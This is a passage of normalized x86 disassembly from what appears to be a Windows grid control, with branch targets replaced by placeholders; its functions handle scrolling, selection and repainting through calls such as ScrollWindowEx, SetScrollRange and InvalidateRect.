pop ecx
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x23c ]
mov esi [ edi + 0x4 ]
cmp eax esi
jge r-xdata
mov esi [ edi ]
mov ebx esi
push ebp
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_466cd0
pop ecx
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x238 ]
mov esi [ edi ]
cmp eax esi
jge r-xdata
push ebp
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x74 ]
call sub_466e08
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov edx [ edi ]
mov eax [ ebp - 0x10 ]
call sub_423a30
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x238 ]
call sub_423a38
mov [ edi ] eax
mov edx [ edi + 0x4 ]
mov eax [ ebp - 0xc ]
call sub_423a30
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x23c ]
call sub_423a38
mov [ edi + 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x258 ]
mov eax [ edi ]
cmp edx eax
jne r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov ecx [ edi + 0x4 ]
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_4673b0
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x25c ]
cmp edx [ edi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_468c80
test eax eax
jg r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_468c60
test eax eax
jg r-xdata
cmp esi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
jmp r-xdata
sub_46719c
push ebp
mov ebp esp
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp ecx [ edx ]
jne r-xdata
mov esi ecx
mov edi eax
cmp eax ecx
jge r-xdata
mov [ edx ] eax
jmp r-xdata
cmp esi [ edx ]
jg r-xdata
mov esi eax
mov edi ecx
pop edi
pop esi
pop ebp
retn 0x4
cmp edi [ edx ]
jl r-xdata
cmp eax ecx
jge r-xdata
dec [ edx ]
inc [ edx ]
jmp r-xdata
sub_4671d0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov ax [ ebx + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
push 0x1
push 0x1
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_467258
mov edx esp
mov eax ebx
call sub_468ca0
mov eax [ esi ]
mov [ ebx + 0x210 ] eax
mov eax [ esi + 0x4 ]
mov [ ebx + 0x214 ] eax
test [ ebx + 0x249 ] 0x10
je r-xdata
mov edx esi
mov eax ebx
call sub_466518
mov edx esp
mov eax ebx
call sub_46741c
jmp r-xdata
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
add esp 0x10
pop esi
pop ebx
retn
sub_467258
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46739d
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jl r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405b10
mov eax [ ebp - 0x20 ]
call sub_463740
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4673a4
lea eax [ ebp - 0x20 ]
call sub_403fe0
retn
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_468ca0
mov eax [ ebx + 0x228 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x22c ]
mov [ ebp - 0x8 ] eax
mov [ ebx + 0x228 ] esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x22c ] eax
test [ ebx + 0x249 ] 0x20
jne r-xdata
cmp esi [ ebx + 0x21c ]
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_464b0c
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x24c ]
jl r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebx + 0x22c ]
mov [ ebx + 0x214 ] eax
test [ ebx + 0x249 ] 0x10
je r-xdata
test [ ebx + 0x248 ] 0x10
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xdc ]
test al al
je r-xdata
test [ ebx + 0x249 ] 0x10
je r-xdata
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x238 ]
mov [ ebx + 0x228 ] eax
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_46741c
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_466b64
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_466b64
lea edx [ ebx + 0x228 ]
mov eax ebx
call sub_466518
sub_4673b0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x258 ]
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebx + 0x258 ]
mov [ esp ] eax
mov eax [ ebx + 0x25c ]
mov [ esp + 0x4 ] eax
mov [ ebx + 0x258 ] esi
mov [ ebx + 0x25c ] edi
mov edx esp
mov eax ebx
call sub_4676ec
cmp edi [ ebx + 0x25c ]
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_46741c
push ebx
push esi
push edi
add esp 0xffffff90
mov ebx edx
mov edi eax
mov eax edi
call sub_444c6c
test al al
je r-xdata
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x1
lea ecx [ esp + 0x4 ]
mov edx ebx
mov eax edi
call sub_466a14
push 0x1
lea edx [ esp + 0x64 ]
mov eax edi
call sub_468ca0
lea edx [ esp + 0x64 ]
lea ecx [ esp + 0x14 ]
mov eax edi
call sub_466a14
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0x10 ]
mov eax esp
call sub_4638bc
mov esi 0x4
lea ebx [ esp + 0x20 ]
push 0x0
push ebx
mov eax edi
call sub_444968
push eax
call InvalidateRect
add ebx 0x10
dec esi
jne r-xdata
sub_467494
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] 0x2
cmp [ ebx + 0x28c ] 0x0
jne r-xdata
test esi esi
jne r-xdata
or [ ebp - 0x8 ] 0x4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
mov eax [ edi + 0x34 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x4 ]
xor edx edx
call sub_412640
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_444968
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx [ edi + 0x34 ]
xor eax eax
call sub_412640
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push 0x0
mov eax ebx
call sub_444968
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x34 ]
mov eax [ edi + 0x4 ]
call sub_412640
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_444968
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x34 ]
xor eax eax
call sub_412640
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push 0x0
mov eax ebx
call sub_444968
push eax
call ScrollWindowEx
jmp r-xdata
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_43db50
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_43db50
sub eax [ edi + 0xc ]
xor edx edx
pop ecx
call sub_412640
neg [ ebp - 0x4 ]
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x4 ]
xor edx edx
call sub_412640
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_468ca0
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_466b90
test [ ebx + 0x249 ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_444968
push eax
call ScrollWindowEx
jmp r-xdata
sub_467640
push ebx
push esi
push edi
add esp 0xffffffa0
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_465bec
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_467494
add esp 0x60
pop edi
pop esi
pop ebx
retn
sub_467668
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
inc edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov [ esi ] ecx
dec edx
sub edx eax
jl r-xdata
mov [ ebp - 0x9 ] 0x1
neg [ esi ]
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
call sub_466b88
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ esi ] eax
mov eax [ ebx + 0x8 ]
sub eax [ ebx + 0x4 ]
cmp eax [ esi ]
jge r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4676ec
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4677ec
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_465bec
push ebp
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x258 ]
mov edx [ ebx ]
lea eax [ ebp - 0x70 ]
call sub_467668
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffa7
call sub_40348c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x25c ]
mov edx [ ebx + 0x4 ]
lea eax [ ebp - 0x40 ]
call sub_467668
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_467494
sub_46776c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
movzx esi di
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_444968
push eax
call GetScrollPos
cmp ebx eax
je r-xdata
test di di
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0xffffffff
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_444968
push eax
call SetScrollPos
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x21c ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0xc ]
sub eax ebx
mov ebx eax
mov eax 0x7f
sub eax ebx
mov ebx eax
jmp r-xdata
sub_4677ec
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
push esi
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
call sub_444c6c
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ esi ]
call sub_465bec
mov eax [ esi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x78 ]
lea edx [ ebp - 0x14 ]
mov eax [ esi ]
call sub_465e24
mov eax [ ebp - 0x80 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x7c ]
mov [ ebp - 0x10 ] eax
mov eax [ esi ]
mov al [ eax + 0x254 ]
sub al 0x1
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
sub al 0x2
jne r-xdata
push ebp
mov eax [ esi ]
mov ebx [ eax + 0x238 ]
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push 0x7f
mov eax [ esi ]
mov eax [ eax + 0x258 ]
sub eax ebx
push eax
call MulDiv
mov edx eax
xor eax eax
call sub_46776c
pop ecx
mov edx [ ebp - 0x5c ]
mov eax [ esi ]
call sub_468c60
mov [ ebp - 0x8 ] eax
mov eax [ esi ]
call sub_43db50
sub eax [ ebp - 0x74 ]
mov [ ebp - 0xc ] eax
mov eax [ esi ]
mov eax [ eax + 0x288 ]
test eax eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + 0x254 ]
add al 0xfe
sub al 0x2
jae r-xdata
push ebp
mov eax [ esi ]
mov ebx [ eax + 0x23c ]
mov eax [ ebp - 0x10 ]
sub eax ebx
push eax
push 0x7f
mov eax [ esi ]
mov eax [ eax + 0x25c ]
sub eax ebx
push eax
call MulDiv
mov edx eax
mov ax 0x1
call sub_46776c
pop ecx
push ebp
mov edx eax
xor eax eax
call sub_46776c
pop ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
sub edx eax
cmp edx [ ebp - 0xc ]
jge r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
push eax
push 0x1
mov ecx 0x4
xor edx edx
mov eax [ esi ]
call sub_466fb4
jmp r-xdata
sub_467938
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1 ] 0x1
sub_46795c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
xor eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
movzx eax bx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_444968
push eax
call GetScrollRange
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
setne al
test bx bx
jne r-xdata
cmp bx 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x1
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x2
jne r-xdata
sub_4679cc
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x5c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_465c70
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x21c ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x70 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x24c ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x6c ] eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x68 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_465e24
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0x70 ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x6c ] edx
pop ecx
pop ecx
pop ebp
retn
sub_467a44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
push eax
call sub_4679cc
pop ecx
mov eax [ ebx ]
cmp eax [ ebp + 0x8 ]
jle r-xdata
push 0xffffffff
push 0x0
push 0x0
movzx eax si
push eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_444968
push eax
call SetScrollRange
push 0xffffffff
push 0x7f
push 0x0
movzx eax si
push eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_444968
push eax
call SetScrollRange
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp + 0x10 ]
push eax
call sub_467938
pop ecx
mov eax [ ebx ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ edi ]
cmp eax [ ebx ]
jle r-xdata
sub_467ac0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x79 ]
sub al 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x238 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea ecx [ eax + 0x258 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x78 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff90
call sub_467a44
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_468c60
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43db50
sub ebx eax
test ebx ebx
jge r-xdata
pop ebx
pop ebp
retn
push 0xffffffff
push ebx
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_444968
push eax
call SetScrollRange
jmp r-xdata
xor ebx ebx
sub_467b54
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x79 ]
add al 0xfe
sub al 0x2
jae r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea ecx [ eax + 0x25c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x74 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff94
call sub_467a44
pop ecx
sub_467b98
push ebp
mov ebp esp
add esp 0xffffff84
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_444c6c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_43db50
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x8 ]
call sub_43db94
mov [ ebp - 0x2c ] eax
push ebp
xor eax eax
call sub_46795c
pop ecx
test al al
je r-xdata
push ebp
mov ax 0x1
call sub_46795c
pop ecx
test al al
je r-xdata
push 0x3
call GetSystemMetrics
add [ ebp - 0x2c ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x258 ]
mov [ ebp - 0x78 ] edx
mov edx [ eax + 0x25c ]
mov [ ebp - 0x74 ] edx
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x254 ]
mov [ ebp - 0x79 ] al
mov eax [ ebp - 0x8 ]
mov [ eax + 0x254 ] 0x0
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_467ca6
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_467ac0
pop ecx
mov eax [ ebp - 0x8 ]
call sub_43db94
mov [ ebp - 0x2c ] eax
push ebp
call sub_467b54
pop ecx
mov eax [ ebp - 0x8 ]
call sub_43db50
cmp eax [ ebp - 0x5c ]
je r-xdata
push 0x2
call GetSystemMetrics
add [ ebp - 0x5c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467cad
mov eax [ ebp - 0x8 ]
mov dl [ ebp - 0x79 ]
mov [ eax + 0x254 ] dl
retn
mov eax [ ebp - 0x8 ]
call sub_43db50
mov [ ebp - 0x5c ] eax
push ebp
call sub_467ac0
pop ecx
sub_467cad
mov eax [ ebp - 0x8 ]
call sub_4677ec
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
cmp eax [ ebp - 0x78 ]
jne r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x8 ]
call sub_4676ec
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x25c ]
cmp eax [ ebp - 0x74 ]
je r-xdata
mov esp ebp
pop ebp
retn
sub_467cf0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4417f4
or [ esi + 0x4 ] 0x10000
mov al [ ebx + 0x254 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ ebx + 0x254 ]
sub al 0x1
je r-xdata
or [ esi + 0x4 ] 0x200000
or [ esi + 0x4 ] 0x100000
sub al 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov [ esi + 0x24 ] 0x8
cmp [ ebx + 0x218 ] 0x1
jne r-xdata
or [ esi + 0x4 ] 0x800000
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
jmp r-xdata
sub_467d6c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x60 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
call sub_465bec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x64 ]
sub eax [ edx + 0x258 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x68 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x68 ] 0x1
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x64 ]
sub eax [ edx + 0x25c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x6c ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6c ] 0x1
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x68 ] 0x1
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x6c ] 0x1
sub_467dd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov edi [ eax ]
cmp ebx edi
jge r-xdata
cmp edx edi
jle r-xdata
mov [ eax ] ebx
jmp r-xdata
mov edx [ eax + 0x4 ]
cmp esi edx
jge r-xdata
mov [ eax ] edx
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov [ eax + 0x4 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_467e18
push ebp
mov ebp esp
add esp 0xffffff6c
push ebx
push esi
push edi
mov [ ebp - 0x6d ] cl
mov ebx edx
mov [ ebp - 0x64 ] eax
lea edi [ ebp - 0x64 ]
mov edx ebx
mov cl [ ebp - 0x6d ]
mov eax [ edi ]
call sub_443794
mov [ ebp - 0x89 ] 0x0
mov dx [ ebx ]
mov cl [ ebp - 0x6d ]
mov eax [ edi ]
mov si 0xffb1
call sub_40348c
test al al
jne r-xdata
mov eax [ edi ]
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
mov [ ebx ] 0x0
or esi 0xffffffff
mov esi 0x1
jmp r-xdata
movzx eax [ ebx ]
cmp eax 0x25
jg r-xdata
movzx eax [ ebx ]
add eax 0xffffffdf
cmp eax 0x7
ja r-xdata
mov eax [ edi ]
mov edx [ eax + 0x228 ]
mov [ ebp - 0x80 ] edx
mov edx [ eax + 0x22c ]
mov [ ebp - 0x7c ] edx
mov eax [ edi ]
mov edx [ eax + 0x258 ]
mov [ ebp - 0x78 ] edx
mov edx [ eax + 0x25c ]
mov [ ebp - 0x74 ] edx
push ebp
call sub_467d6c
pop ecx
test [ ebp - 0x6d ] 0x4
je r-xdata
sub eax 0x26
je r-xdata
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x88 ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x94 ]
push eax
lea ecx [ ebp - 0x60 ]
lea edx [ ebp - 0x88 ]
mov eax [ edi ]
call sub_465e24
mov eax [ ebp - 0x94 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x90 ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp - 0x88 ]
push eax
mov eax [ ebp - 0x84 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x23c ]
mov eax [ edi ]
mov edx [ eax + 0x238 ]
lea eax [ ebp - 0x78 ]
call sub_467dd8
mov edx [ edi ]
mov edx [ edx + 0x258 ]
mov eax [ ebp - 0x78 ]
cmp edx eax
jne r-xdata
jmp [ eax * 4 + jump_table_467ec4 ]
dec [ ebp - 0x7c ]
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
cmp eax 0x22
jg r-xdata
mov ecx [ ebp - 0x74 ]
mov edx eax
mov eax [ edi ]
call sub_4673b0
mov edx [ edi ]
mov edx [ edx + 0x25c ]
cmp edx [ ebp - 0x74 ]
je r-xdata
dec [ ebp - 0x74 ]
jmp r-xdata
inc [ ebp - 0x74 ]
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x25c ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov si 0xffc8
call sub_40348c
mov [ ebp - 0x89 ] al
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov si 0xffc8
call sub_40348c
